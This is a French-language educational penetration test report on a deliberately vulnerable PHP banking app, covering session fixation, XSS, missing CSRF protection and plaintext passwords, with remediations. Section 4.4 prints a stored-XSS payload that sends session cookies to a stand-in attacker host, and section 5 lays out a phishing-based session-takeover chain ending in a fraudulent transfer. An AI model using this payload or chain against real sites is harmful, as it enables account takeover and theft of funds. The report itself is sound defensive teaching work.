# Rapport de test d'intrusion — P03

**Application** : CaptusBank (interface bancaire en ligne)
**Version testée** : `app-vulnerable` (build pédagogique)
**Date** : 2026-05-12
**Auteur** : Youssef BEN — projet P03 (BLUE TEAM)
**Classification** : Pédagogique — Diffusion restreinte

---

## 1. Résumé exécutif

Une chaîne d'attaque combinant **Session Fixation** (CWE-384) et **Cross-Site Scripting**
(CWE-79) permet à un attaquant distant non authentifié de prendre le contrôle complet
du compte d'un utilisateur authentifié et d'exécuter des opérations bancaires
(virements) en son nom.

| Critère              | Valeur                                       |
|----------------------|----------------------------------------------|
| Sévérité globale     | **Critique**                                 |
| Score CVSS 3.1       | **9.0 / 10** (Critical)                      |
| Vecteur CVSS         | `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L`        |
| Authentification     | Non requise côté attaquant                   |
| Pré-requis           | Interaction utilisateur (clic phishing)      |
| Impact financier     | Vol direct des fonds disponibles             |
| Impact RGPD          | Accès à des données personnelles bancaires   |

### Recommandation principale

Déployer immédiatement la version `app-secure` qui implémente toutes les contre-mesures
détaillées en section 6 — en particulier la **régénération du session ID après authentification**
(`session_regenerate_id(true)`), absente de la version vulnérable.

---

## 2. Périmètre

| Cible              | URL                          | Mode            |
|--------------------|------------------------------|-----------------|
| App vulnérable     | http://vuln.bank.local       | Boîte grise     |
| App sécurisée      | http://secure.bank.local     | Test comparatif |
| Serveur attaquant  | http://evil.attacker.lab     | Infra dédiée    |
| Base de données    | MySQL 8 (`bank_vuln`)        | Accès lecture   |

---

## 3. Méthodologie

Conforme **PTES** (Penetration Testing Execution Standard) et **OWASP ASVS v4.0** :

1. **Reconnaissance** — Inspection passive des cookies, headers, formulaires.
2. **Identification** — Repérage de la non-régénération du SID (test comparatif des cookies pré/post-auth).
3. **Exploitation** — Construction et déclenchement de la chaîne fixation + XSS.
4. **Post-exploitation** — Persistance, exfiltration, démonstration d'impact.
5. **Reporting** — Documentation, scoring CVSS, plan de remédiation.

---

## 4. Vulnérabilités identifiées

### 4.1 — V001 · Absence de régénération du Session ID (CRITIQUE)

| | |
|---|---|
| **CWE**     | [CWE-384 — Session Fixation](https://cwe.mitre.org/data/definitions/384.html) |
| **OWASP**   | A07:2021 — Identification and Authentication Failures |
| **CVSS**    | 9.0 (`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L`) |
| **Fichier** | [app-vulnerable/public/login.php](../app-vulnerable/public/login.php) |
| **Lignes**  | 27–35 (bloc post-`hash_equals`) |

**Description** : Après authentification réussie, l'application réutilise l'identifiant
de session qui existait avant le login. Un attaquant capable d'imposer un SID à la
victime hérite donc de la session authentifiée.

**Preuve** : voir section 5, étape 6.

**Remédiation** :
```php
// AVANT (vulnérable) — login.php
$_SESSION['user_id'] = (int)$user['id'];

// APRÈS (corrigé)
session_regenerate_id(true);   // 'true' supprime l'ancien SID côté serveur
$_SESSION['user_id'] = (int)$user['id'];
```

---

### 4.2 — V002 · `use_strict_mode = 0` (ÉLEVÉE)

| | |
|---|---|
| **CWE**     | CWE-384 |
| **CVSS**    | 7.5 (`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`) |
| **Fichier** | [app-vulnerable/Dockerfile](../app-vulnerable/Dockerfile) |

Le serveur PHP accepte n'importe quel SID fourni par le client, même s'il n'a jamais
été émis. Combiné à V001, l'attaquant peut choisir un SID arbitraire (ex : `ATTACKER_FIXED_SID_001`)
et l'imposer à la victime.

**Remédiation** : `php.ini` → `session.use_strict_mode = 1`.

---

### 4.3 — V003 · `use_trans_sid = 1` (ÉLEVÉE)

PHP accepte la transmission du SID via paramètre URL (`?PHPSESSID=…`), facilitant l'exploitation
par phishing.

**Remédiation** : `session.use_trans_sid = 0` et `session.use_only_cookies = 1`.

---

### 4.4 — V004 · XSS stocké dans les commentaires (CRITIQUE)

| | |
|---|---|
| **CWE**     | [CWE-79](https://cwe.mitre.org/data/definitions/79.html) |
| **OWASP**   | A03:2021 — Injection |
| **CVSS**    | 8.4 (`AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`) |
| **Fichier** | [app-vulnerable/public/comments.php](../app-vulnerable/public/comments.php) |
| **Lignes**  | 35 (`<?= $r['content'] ?>` sans échappement) |

**Description** : Le contenu utilisateur est inséré tel quel dans le DOM. Un commentaire
contenant du JavaScript s'exécute pour tout visiteur authentifié.

**Payload de démo** :
```html
<script>
document.cookie="PHPSESSID=ATTACKER_FIXED_SID_001; path=/";
new Image().src="http://evil.attacker.lab/collect.php?sid="+document.cookie;
</script>
```

**Remédiation** : `htmlspecialchars($content, ENT_QUOTES|ENT_SUBSTITUTE|ENT_HTML5, 'UTF-8')`
+ Content-Security-Policy stricte.

---

### 4.5 — V005 · XSS réfléchie via `?msg=` (ÉLEVÉE)

`login.php` insère `$_GET['msg']` sans échappement → exécution de code arbitraire
via lien forgé.

---

### 4.6 — V006 · Cookies sans `HttpOnly`, `Secure` ni `SameSite` (ÉLEVÉE)

Le cookie de session est lisible en JS (renforce l'impact des XSS) et transmis sur
des requêtes cross-site.

**Remédiation** :
```php
session_set_cookie_params([
    'httponly' => true,
    'secure'   => true,           // TLS uniquement en prod
    'samesite' => 'Strict',
]);
```

---

### 4.7 — V007 · Absence de token CSRF sur les mutations (MOYENNE)

Les endpoints `/transfer.php`, `/comments.php`, `/profile.php` acceptent les POST sans
token anti-CSRF. Combiné aux autres vulnérabilités, un attaquant peut déclencher
des virements à l'insu de la victime.

---

### 4.8 — V008 · `logout.php` ne détruit ni le cookie ni la session côté serveur (MOYENNE)

Après "déconnexion", le SID reste valide en base — un attaquant qui le connaît reste
authentifié.

---

### 4.9 — V009 · Mots de passe stockés en clair (CRITIQUE)

| **CWE** | CWE-256 / CWE-916 |
|---|---|
| **CVSS** | 7.5 |

Les mots de passe sont stockés en clair dans `users.password`. Un dump SQL expose
tout le parc utilisateurs.

**Remédiation** : `password_hash($plain, PASSWORD_BCRYPT, ['cost' => 12])`
+ `password_verify` à la connexion.

---

## 5. Scénario d'exploitation (chaîne)

```
[Mallory]
   1) GET vuln.bank.local/login.php  (cookie: PHPSESSID=ATTACKER_FIXED_SID_001)
      → le SID est accepté et persiste (use_strict_mode=0)

   2) POST /login.php (mallory / EvilPass1!)  — pour matérialiser le SID en BDD
      → PHPSESSID=ATTACKER_FIXED_SID_001 est désormais une session valide

   3) POST /comments.php
      payload = <script>document.cookie="PHPSESSID=ATTACKER_FIXED_SID_001"; …</script>
      → XSS stocké propagé

   4) Email phishing envoyé à Alice :
      "Vérifiez votre compte" → http://vuln.bank.local/login.php?PHPSESSID=ATTACKER_FIXED_SID_001

[Alice]
   5) Clique sur le lien, son navigateur reçoit PHPSESSID=ATTACKER_FIXED_SID_001
   6) Visite /comments.php → le payload XSS lui réécrit AUSSI le cookie (double assurance)
   7) Se connecte avec ses vraies credentials
      → NO regenerate → le SID reste ATTACKER_FIXED_SID_001 mais user_id=1 (Alice)

[Mallory]
   8) Rejoue PHPSESSID=ATTACKER_FIXED_SID_001
      → GET /dashboard.php → 200 OK, voit le compte d'Alice (12 450 €)
   9) POST /transfer.php to_iban=FR76… amount=9999.99
      → virement effectué (pas de CSRF, pas de 2FA)
```

### Preuve par la base de données

```sql
SELECT sid, user_id, ip_address, last_seen
FROM bank_vuln.sessions
WHERE sid = 'ATTACKER_FIXED_SID_001';
-- → un seul row, user_id=1 (alice), 2 IP distinctes constatées dans nginx.log
```

---

## 6. Plan de remédiation

| # | Vuln  | Action                                                       | Effort | Priorité |
|---|-------|--------------------------------------------------------------|--------|----------|
| 1 | V001  | Ajouter `session_regenerate_id(true)` après login            | 1h     | P0       |
| 2 | V002  | `session.use_strict_mode = 1`                                | 5 min  | P0       |
| 3 | V003  | `session.use_only_cookies = 1; use_trans_sid = 0`            | 5 min  | P0       |
| 4 | V004  | `htmlspecialchars` + CSP stricte sur toutes les sorties      | 1 jour | P0       |
| 5 | V005  | Idem 4 sur `$_GET`                                           | 1h     | P0       |
| 6 | V006  | Cookies `HttpOnly`, `Secure`, `SameSite=Strict`              | 30 min | P0       |
| 7 | V007  | Token CSRF (`bin2hex(random_bytes(32))`) + `hash_equals`     | 2h     | P1       |
| 8 | V008  | `session_destroy()` + suppression cookie + log audit         | 30 min | P1       |
| 9 | V009  | Migration `password_hash` + script de rehash                 | 4h     | P0       |
| 10| —     | Binding session ↔ UA/IP-/24 + rotation 5 min                 | 1 jour | P1       |
| 11| —     | Audit log + règles Sigma SIEM                                | 1 jour | P2       |
| 12| —     | Compte honeypot + alertes immédiates                         | 2h     | P2       |

Le delta de code complet est implémenté dans `app-secure/`. Voir
[REMEDIATION.md](REMEDIATION.md) pour le détail technique.

---

## 7. Annexes

- [SCENARIO.md](SCENARIO.md) — Scénario narratif détaillé
- [THREAT-MODEL.md](THREAT-MODEL.md) — Threat model STRIDE + attack tree
- [REMEDIATION.md](REMEDIATION.md) — Contre-mesures techniques détaillées
- [../siem/](../siem/) — Règles Sigma de détection
- [../tests/](../tests/) — Tests pytest reproduisant l'attaque et validant la correction
- [../scripts/attack.py](../scripts/attack.py) — Script d'attaque automatisé

### Références

- OWASP Top 10 (2021) : https://owasp.org/Top10/
- OWASP ASVS v4.0 §3 (Session Management) : https://owasp.org/www-project-application-security-verification-standard/
- ANSSI — Recommandations sécurité applicative (NP-DEV) : https://cyber.gouv.fr/
- PHP Session security : https://www.php.net/manual/en/session.security.php
